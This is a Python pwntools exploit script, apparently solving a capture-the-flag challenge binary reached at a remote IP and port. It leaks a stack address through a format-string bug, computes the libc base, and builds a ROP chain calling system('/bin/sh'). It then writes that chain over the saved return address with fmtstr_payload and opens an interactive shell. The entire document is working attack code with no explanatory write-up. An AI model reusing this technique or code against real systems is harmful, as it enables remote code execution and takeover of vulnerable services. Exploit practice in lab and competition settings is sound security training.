from pwn import *
context.encoding = 'latin'
elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
context.binary = elf.path

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("45.153.243.57", 13337)
    else:
        return process([elf.path])


BUF_LEN = 256

while(1):
    io = start()
    io.sendlineafter("> ", "1")
    payload = flat({0: " %p"*10,BUF_LEN: p16(elf.sym.text)})
    # fmt offset is 10
    # payload = flat({0: "AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p",BUF_LEN: p16(elf.sym.text)})
    io.sendafter("Enter new text: ", payload)
    io.sendlineafter("> ", "9")
    possible_leak = io.clean(0.3)
    if b"claacmaacnaac" in possible_leak:
        print(possible_leak)
        leaked_stack_addr = int(possible_leak.split(b" ")[6], 16)
        info(f"Leaked Stack Address: {hex(leaked_stack_addr)}")
        libc_stack_addr = leaked_stack_addr + 8 # this a libc address and also the saved RIP wowzers!
        io.sendline("1")
        payload = flat({BUF_LEN: libc_stack_addr})
        io.sendafter("Enter new text: ", payload)
        io.sendlineafter("> ", "9")
        libc_addr = u64(io.recvuntil("Menu")[:-4].ljust(8, b"\0")) 
        libc_puts = libc_addr + 356672
        info(f"Leaked libc puts: {hex(libc_puts)}")
        libc.address = libc_puts - libc.sym.puts
        text_stack_buf = leaked_stack_addr - 272
        info(f"Stack Buffer: {hex(text_stack_buf)}")
        rop = ROP(libc)
        rop.call(rop.ret[0])
        rop.system(next(libc.search(b"/bin/sh\0")))
        rop_payload = rop.chain()
        print(len(rop_payload))
        # quit()
        # print(rop.dump())
        fmt_payload = fmtstr_payload(10, {libc_stack_addr: rop_payload}, write_size='short')
        info(f"Fmt Payload Size: {len(fmt_payload)} Bytes")
        payload = flat({0: fmt_payload,  BUF_LEN: text_stack_buf})
        info(f"Trying to overwrite: {hex(libc_stack_addr)}")
        io.sendlineafter("> ", "1")
        io.sendafter("Enter new text: ", payload)
        io.sendlineafter("> ", "2")
        io.sendlineafter("> ", "9")
        # gdb.attach(io)
        io.sendlineafter("> ", "3")
        io.interactive()
        break
